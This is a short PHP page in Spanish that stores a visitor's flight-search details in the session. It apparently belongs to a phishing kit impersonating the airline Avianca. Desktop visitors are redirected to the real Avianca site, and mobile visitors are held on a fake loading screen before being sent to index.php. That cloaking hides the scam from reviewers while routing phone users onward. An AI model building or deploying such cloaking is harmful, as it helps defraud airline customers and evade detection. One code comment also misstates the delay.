<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fechaIda = $_POST["fechaIda"];
    $fechaVuelta = $_POST["fechaVuelta"];
    $fromD = $_POST["origenDesde"];
    $fromA = $_POST["origenAeropuerto"];
    $untilH = $_POST["destinoHacia"];
    $untilA = $_POST["destinoAeropuerto"];


    session_start();

    $_SESSION['fromD'] = $fromD;
    $_SESSION['untilH'] = $untilH;

}


function esDispositivoMovil() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dispositivosMoviles = array(
        'Android', 'webOS', 'iPhone', 'iPad',
        'iPod', 'BlackBerry', 'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

if (esDispositivoMovil()) {

} else {
    header('location:https://www.avianca.com/es/?poscode=CO&gad_source=1&gclid=Cj0KCQiAmNeqBhD4ARIsADsYfTf3M3CnHWAuPB5TJMPNHLxyBwgvsTEQ9E9ZtptQKnou4p8WNm3papAaAka8EALw_wcB');

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirección</title>
    <style>*{
    margin: 0;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
    }</style>
</head>
<body>

<br><br><br><br><br><br><br>
    <center><img src="/assets/loading.gif" alt="" srcset="" width="25%"></center>

    <script>
        // Espera 3000 milisegundos (3 segundos) antes de redirigir
        setTimeout(function() {
            // Cambia la URL a la que quieres redirigir
            window.location.href = 'index.php';
        }, 6000);
    </script>

</body>
</html>
